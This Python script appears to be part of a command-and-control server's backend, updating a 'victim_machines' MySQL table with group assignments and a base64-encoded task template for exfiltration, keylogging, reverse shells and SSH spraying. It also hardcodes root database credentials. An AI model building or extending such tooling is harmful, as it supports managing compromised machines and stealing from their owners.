#!/usr/bin/env python
import io
import re
import base64
import sys
import json
import time
import mysql.connector
from mysql.connector import MySQLConnection, Error

def decode ( input ):
        output_bytes = input.encode('ascii')
        decoded_output_bytes = base64.b64decode(output_bytes)
        decoded_output = decoded_output_bytes.decode('ascii')
        return decoded_output

def encode ( input ):
	updated_entry = input.encode('ascii')
	updated_bytes = base64.b64encode(updated_entry)
	encoded_updated = updated_bytes.decode('ascii')
	return encoded_updated

def updategroup( id, group_id ):

	#base query to check whether or not the id requested appears in the database
	query = """ SELECT group_id FROM victim_machines WHERE victim_id =%s """
	data = (id,)

	#https://www.mysqltutorial.org/python-mysql-update/
	try:
		#connect to the mysql database
		connection = MySQLConnection(host='localhost',database='JOB_C2',user='root',password='newpassword',auth_plugin='mysql_native_password')
		if connection.is_connected():
			print('Connected to JOB_C2 database')

		cursor = connection.cursor(buffered=True)
		cursor.execute(query,data)
		result = cursor.fetchall()

		if result:
			print("id found in the database, modifying entry...")

			#update the database if the row already exists
			update_query = """ UPDATE victim_machines SET group_id=%s WHERE victim_id=%s """
			update_data = (group_id, id)

			cursor.execute(update_query, update_data)

		#catch the case in which the victim_id does not exist in the table and create a new entry
		else:
			print("id not found in the database")
			print("creating new entry in database...")
			empty_json = "e30="
			formatted_command = "{\"commands\": {}, \"exfiltrate\": {}, \"infiltrate\": {}, \"keylogger\": \"\", \"shell\": {\"ip\": \"0.0.0.0\", \"port\": \"0\"}, \"sshspray\": \"0\"}"
			formatted_encoded = encode(formatted_command)

			create_query = """ INSERT INTO victim_machines (victim_id, group_id, command, command_output, command_record, file_names) VALUES (%s, %s, %s, %s, %s, %s) """
			create_data = (id, group_id, formatted_encoded,empty_json, formatted_encoded, empty_json)

			cursor.execute(create_query, create_data)

		connection.commit()

	except Error as error:
		print(error)

	finally:
		cursor.close()
		connection.close()

	return True

if __name__ == "__main__":
	updategroup(*sys.argv[1:])
